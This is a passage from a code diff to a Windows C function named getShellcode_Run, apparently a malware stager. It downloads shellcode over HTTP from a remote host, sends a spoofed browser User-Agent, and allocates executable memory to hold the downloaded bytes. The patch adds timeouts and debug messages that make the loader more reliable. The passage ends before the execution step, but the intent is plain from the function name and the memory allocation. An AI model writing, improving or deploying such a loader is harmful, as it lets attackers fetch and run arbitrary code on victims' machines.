@@ -330,6 +330,12 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         goto cleanup;
     }
 
+    // Set timeouts at the session level
+    DWORD timeout = 10000;  // 10 seconds
+    InternetSetOption(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
+    InternetSetOption(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
+    InternetSetOption(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
+
     hConnect = InternetConnectA(hInternet, host, atoi(port), NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
     if (!hConnect) {
         char msg[256];
@@ -346,12 +352,18 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         goto cleanup;
     }
 
+    // Set timeouts at the request level
+    InternetSetOption(hRequest, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
+    InternetSetOption(hRequest, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
+    InternetSetOption(hRequest, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
+
     // Add headers
     char headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n"
                      "Accept: */*\r\n"
                      "Connection: keep-alive\r\n";
     HttpAddRequestHeadersA(hRequest, headers, -1L, HTTP_ADDREQ_FLAG_ADD);
 
+    OutputDebugStringA("Sending request...\n");
     bResults = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
     if (!bResults) {
         char msg[256];
@@ -360,6 +372,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         goto cleanup;
     }
 
+    OutputDebugStringA("Request sent, receiving response...\n");
     do {
         dwSize = 0;
         if (!InternetQueryDataAvailable(hRequest, &dwSize, 0, 0)) {
@@ -378,6 +391,9 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         ZeroMemory(pszOutBuffer, dwSize + 1);
 
         if (InternetReadFile(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
+            char msg[256];
+            sprintf_s(msg, "Downloaded %lu bytes\n", dwDownloaded);
+            OutputDebugStringA(msg);
             PVOID shellcodeAddr = NULL;
             SIZE_T shellcodeSize = dwDownloaded;
             NTSTATUS status = NtAllocateVirtualMemory(NtCurrentProcess(), &shellcodeAddr, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
